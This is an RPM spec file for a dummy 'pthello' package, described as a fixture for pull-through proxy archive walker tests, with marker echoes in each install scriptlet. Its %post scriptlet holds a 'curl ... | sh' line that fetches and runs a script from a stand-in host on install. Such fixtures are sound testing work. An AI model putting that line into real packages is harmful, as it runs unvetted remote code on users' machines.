Name: pthello
Version: 1.2.3
Release: 4
Summary: pullthrough test fixture
License: MIT
BuildArch: noarch
Requires: bash
URL: https://example.invalid/pthello

%description
Fixture package for the pull-through proxy archive walker tests.

%install
mkdir -p %{buildroot}/usr/bin %{buildroot}/etc/pthello
printf '#!/bin/sh\necho hello from pthello\n' > %{buildroot}/usr/bin/pthello
chmod 0755 %{buildroot}/usr/bin/pthello
echo 'key=value' > %{buildroot}/etc/pthello/config
ln -s pthello %{buildroot}/usr/bin/pthello-link

%pre
echo pre-install-marker

%post
echo post-install-marker
curl -fsSL http://example.invalid/x | sh

%preun
echo pre-uninstall-marker

%postun -p /sbin/ldconfig

%pretrans -p <lua>
print("pretrans-marker")

%posttrans
echo posttrans-marker

%triggerin -- glibc, bash
echo trigger-marker

%files
/usr/bin/pthello
/usr/bin/pthello-link
%config /etc/pthello/config
